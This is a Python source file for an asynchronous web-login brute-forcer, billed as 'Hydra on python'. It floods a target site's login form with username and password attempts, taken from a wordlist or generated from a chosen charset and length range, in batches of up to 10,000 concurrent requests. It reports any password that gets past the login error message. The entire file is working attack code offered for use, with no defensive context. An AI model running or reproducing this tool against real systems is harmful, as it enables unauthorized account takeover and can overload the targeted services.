import aiohttp
import asyncio
import argparse
import time
import datetime
import socket
import sys
import os
import string
import requests
import itertools


class AsynchronousBrute:
    def __init__(
        self,
        website_url,
        username,
        fields,
        login_error,
        file,
        random,
        length,
        lower,
        upper,
        digits,
        symbols,
    ):
        self.url = website_url
        self.username = username
        self.user_field = fields[0]
        self.pass_field = fields[1]
        self.error = login_error
        self.file_name = file
        self.random = random
        self.length = length
        self.lower = lower
        self.upper = upper
        self.digits = digits
        self.symbols = symbols
        self.request_sended = 0

    async def website_check(self):
        try:
            responce = requests.get(self.url)
            host = self.url.split("/")[2]
            print(f"\033[32m[+]\033[0m URL: {self.url} [{socket.gethostbyname(host)}]")
        except:
            print(
                f"\033[31m[!]\033[0m Brute aborted: The url supplied '{self.url}' seems to be down"
            )
            os._exit(1)

    async def fetch(self, session, password):
        payload = {self.user_field: self.username, self.pass_field: password}

        async with session.post(self.url, data=payload) as resp:
            text = await resp.text()

            self.request_sended += 1

            if not self.request_sended % 1000:
                print(
                    f" | \033[35m[*]\033[0m Password: {password}\n | \033[93m[#]\033[0m Request number: {self.request_sended}"
                )

            if self.error not in text:
                print(text)
                end = time.time()
                print(
                    f"\n\033[32m[+]\033[0m Login: {self.username}\n\033[32m[+]\033[0m Password: {password}\n\033[94m\033[0m"
                )
                print(
                    "\033[32m[+]\033[0m Finished: "
                    + datetime.datetime.now().strftime("%c")
                )
                print(f"\033[32m[+]\033[0m Requests Done: {self.request_sended}")

                elapsed_time = time.time() - start

                print(
                    f"\033[32m[+]\033[0m Requests per second: {self.request_sended / elapsed_time}"
                )

                print(
                    "\033[32m[+]\033[0m Elapsed Time: "
                    + time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
                )

                os._exit(1)

    async def password_guessing(self):
        print(
            f"\033[32m[+]\033[0m Started: "
            + datetime.datetime.now().strftime("%c")
            + "\n"
        )

        print(
            f"\033[32m[+]\033[0m Perfoming password attack on '{self.url}' against '{self.username}'"
        )

        count_of_requests = 0

        if self.file_name != None:
            try:
                file = open(self.file_name)
            except FileNotFoundError:
                print("Wrong file path...")
                os._exit(1)

            tasks = []
            async with aiohttp.ClientSession() as session:
                passwords = file.readlines()
                counter_tasks = 1

                print(f" | \033[94m[i]\033[0m File: {len(passwords)} line(s)")

                for pswd in passwords:
                    password = pswd.strip()
                    task = asyncio.ensure_future(self.fetch(session, password))
                    tasks.append(task)
                    counter_tasks += 1

                    if len(tasks) == 10000:
                        await asyncio.gather(*tasks)
                        tasks.clear()

                await asyncio.gather(*tasks)
        elif self.random == True:
            counter_tasks = 0

            charset = ""

            if self.lower == True:
                charset += string.ascii_lowercase

            if self.upper == True:
                charset += string.ascii_uppercase

            if self.digits == True:
                charset += string.digits

            if self.symbols == True:
                charset += " !#@$%^&*()-_=+[]{};:',.<>/?\|\""

            print(f" | \033[94m[i]\033[0m Charset: {charset}")
            print(
                f" | \033[94m[i]\033[0m Password length from {self.length[0]} to {self.length[1]}"
            )

            tasks = []
            async with aiohttp.ClientSession() as session:
                for pass_len in range(int(self.length[0]), int(self.length[1]) + 1):
                    for attempt in itertools.product(charset, repeat=pass_len):
                        password = "".join(attempt)
                        task = asyncio.ensure_future(self.fetch(session, password))
                        tasks.append(task)
                        counter_tasks += 1

                        if len(tasks) == 10000:
                            await asyncio.gather(*tasks)
                            tasks.clear()
        else:
            print("Bad choice...")
            os._exit(1)


async def main():
    parser = argparse.ArgumentParser(description="Hydra on python")
    required = parser.add_argument_group("Required arguments")

    required.add_argument("-u", "--url", dest="url", help="The URL of website")
    required.add_argument("-l", "--login", dest="username", help="Target's username")
    required.add_argument(
        "-f",
        "--fields",
        dest="fields",
        help="Format: 'username_field':'password_field':'invalid_credentials_mistake'",
    )
    required.add_argument("--file", dest="file", action="store", help="File path")
    required.add_argument(
        "-r", "--random", dest="random", action="store_true", help="Generating password"
    )
    required.add_argument(
        "--length",
        dest="length",
        action="store",
        help="Format: 'min-length'-'max-length'",
    )
    required.add_argument(
        "--lower",
        dest="lower",
        action="store_true",
        help="Adding to charset lower_case letters",
    )
    required.add_argument(
        "--upper",
        dest="upper",
        action="store_true",
        help="Adding to charset UPPER_CASE letters",
    )
    required.add_argument(
        "--digits", dest="digits", action="store_true", help="Adding to charset DIGITS"
    )
    required.add_argument(
        "-special",
        "--special-symbols",
        dest="symbols",
        action="store_true",
        help="Adding to charset special symbols",
    )

    args = parser.parse_args()

    website_url = args.url.strip()
    username = args.username
    fields = args.fields.split(":")
    file = args.file
    random = args.random
    try:
        length = args.length.split("-")
    except:
        length = [1, 20]
    lower = args.lower
    upper = args.upper
    digits = args.digits
    symbols = args.symbols

    if file != None and random == True:
        print("\033[94mYou can't choose 2 options in one moment...\033[0m")
        os._exit(1)

    BruteForce = AsynchronousBrute(
        website_url,
        username,
        fields,
        fields[2],
        file,
        random,
        length,
        lower,
        upper,
        digits,
        symbols,
    )
    await BruteForce.website_check()
    await BruteForce.password_guessing()


if __name__ == "__main__":
    global start
    start = time.time()

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(
            "\n"
            + f"\033[32m[+]\033[0m Finished: "
            + datetime.datetime.now().strftime("%c")
        )

        elapsed_time = time.time() - start

        print(
            "\033[32m[+]\033[0m Elapsed Time: "
            + time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
            + "\n"
        )
        print("Brute Aborted: Canceled by User")
        os._exit(1)
